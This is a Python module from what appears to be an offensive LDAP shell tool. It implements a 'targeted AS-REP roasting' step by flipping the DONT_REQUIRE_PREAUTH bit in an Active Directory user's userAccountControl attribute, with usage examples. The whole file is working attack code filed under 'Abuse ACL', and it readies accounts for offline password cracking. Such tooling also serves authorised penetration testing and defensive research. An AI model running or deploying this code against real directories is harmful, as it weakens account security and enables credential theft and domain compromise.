import logging
from ldap3 import Connection, MODIFY_REPLACE
from ldapdomaindump import domainDumper
from pydantic import BaseModel, Field
from ldap_shell.ldap_modules.base_module import BaseLdapModule, ArgumentType
from ldap_shell.utils.ldap_utils import LdapUtils

class LdapShellModule(BaseLdapModule):
    """Module for configuring DONT_REQUIRE_PREAUTH flag on user accounts. Targeted AsRepRoast attack."""
    
    help_text = "Targeted AsRepRoast attack. Set or unset DONT_REQUIRE_PREAUTH flag for a target user."
    examples_text = """
    Enable DONT_REQUIRE_PREAUTH for user john:
    `set_dontreqpreauth john true`
    ```
    [INFO] Updated userAccountControl attribute successfully
    ```
    
    Disable DONT_REQUIRE_PREAUTH for user john:
    `set_dontreqpreauth john false`
    ```
    [INFO] Updated userAccountControl attribute successfully
    ```
    """
    module_type = "Abuse ACL"

    class ModuleArgs(BaseModel):
        target: str = Field(
            description="Target user (sAMAccountName)",
            arg_type=ArgumentType.USER
        )
        flag: bool = Field(
            description="true to enable, false to disable",
            arg_type=ArgumentType.BOOLEAN
        )

    def __init__(self, args_dict: dict, 
                 domain_dumper: domainDumper, 
                 client: Connection,
                 log=None):
        self.args = self.ModuleArgs(**args_dict)
        self.domain_dumper = domain_dumper
        self.client = client
        self.log = log or logging.getLogger('ldap-shell.shell')
        self.UF_DONT_REQUIRE_PREAUTH = 4194304

    def __call__(self):
        # Get target DN
        target_dn = LdapUtils.get_dn(self.client, self.domain_dumper, self.args.target)
        if not target_dn:
            self.log.error(f'Target user not found: {self.args.target}')
            return

        # Parse flag
        if self.args.flag == True:
            enable = True
        elif self.args.flag == False:
            enable = False
        else:
            self.log.error('Flag must be either true or false')
            return

        # Get current userAccountControl
        try:
            entry = self.client.search(
                target_dn,
                '(objectClass=*)',
                attributes=['userAccountControl']
            )
            if not entry or len(self.client.entries) != 1:
                self.log.error('Failed to get userAccountControl attribute')
                return

            current_uac = self.client.entries[0]['userAccountControl'].value
            self.log.debug(f'Current userAccountControl: {current_uac}')

            # Modify flag
            if enable:
                new_uac = current_uac | self.UF_DONT_REQUIRE_PREAUTH
            else:
                new_uac = current_uac & ~self.UF_DONT_REQUIRE_PREAUTH

            self.log.debug(f'New userAccountControl: {new_uac}')

            # Apply changes
            res = self.client.modify(
                target_dn,
                {'userAccountControl': [(MODIFY_REPLACE, [new_uac])]}
            )

            if res:
                self.log.info('Updated userAccountControl attribute successfully')
                if enable:
                    self.log.info(f'DONT_REQUIRE_PREAUTH enabled for {self.args.target}')
                else:
                    self.log.info(f'DONT_REQUIRE_PREAUTH disabled for {self.args.target}')
            else:
                self.log.error(f'Failed to modify userAccountControl: {self.client.result["description"]}')

        except Exception as e:
            self.log.error(f'Error modifying userAccountControl: {str(e)}')
            return

